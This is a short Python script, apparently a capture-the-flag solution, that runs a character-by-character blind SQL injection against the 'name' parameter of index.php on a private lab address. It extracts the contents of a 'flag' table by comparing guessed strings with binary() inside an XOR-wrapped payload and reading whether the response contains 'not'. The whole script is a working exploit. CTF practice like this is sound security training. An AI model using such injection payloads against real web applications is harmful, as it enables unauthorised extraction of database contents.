import requests
import time
import binascii
import urllib.parse

url = "http://192.168.31.119:9990/index.php?name="
dicc = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ '
flag = 'flag{hello_'
prev = ''
while True:
    for i in dicc:
        a = flag + i
        name_data = '\'^(if((1,binary(\'{}\'))>(table flag),1,0))^\''.format(a)

        print(url + urllib.parse.quote(name_data))
        res = requests.get(url + urllib.parse.quote(name_data))
        print(res.text)
        if 'not' in res.text:
            flag += prev
            print(flag)
            break

        prev = i
